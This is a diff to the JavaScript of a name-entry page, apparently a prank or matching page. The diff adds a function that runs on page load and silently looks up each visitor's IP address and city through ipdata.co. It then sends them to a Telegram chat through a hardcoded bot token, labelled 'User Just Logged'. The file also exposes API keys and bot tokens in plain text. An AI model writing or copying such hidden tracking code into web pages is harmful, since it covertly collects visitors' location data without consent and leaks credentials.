@@ -1,17 +1,32 @@
-function run() {
-let firstName = document.getElementById('fname').value;
-let secondName = document.getElementById('sname').value;
-if(firstName == "" || secondName == ""){
-  alert(" -- Please enter all the NIBBA or NIBBI details -- ");
-function json(url) {
+/* fetch('https://api.telegram.org/bot5218159361:AAGkRRiN7-p9qDyV5ULidhImE-iy38Vxogo/getupdates').then( res => {
+  return res.json();
+}) .then(data => {
+  console.log(data);
+}); */
+
+
+logged();
+function logged(){
+  
+ function json(url) {
   return fetch(url).then(res => res.json());
 }
 let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
 let data1 = data.ip;
   let city1 = data.city;
-fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=✶•> Empty check bro %0A✶•> '+data1+"%0A✶•> "+city1);
+fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=✶•> User Just Logged %0A✶•> '+data1+"%0A✶•> "+city1);
   } );
+  
+}
+
+
+function run() {
+let firstName = document.getElementById('fname').value;
+let secondName = document.getElementById('sname').value;
+if(firstName == "" || secondName == ""){
+  alert(" -- Please enter all the NIBBA or NIBBI details -- ");
+logged();
 }
 else{
  firstName = firstName.toLowerCase();
@@ -95,7 +110,6 @@ for (l=0;l<1;l++){
 fname.value = '';
 sname.value = '';
 
-
 function json(url) {
   return fetch(url).then(res => res.json());
 }
@@ -130,4 +144,3 @@ let api = new XMLHttpRequest();
 
    }
   }
-
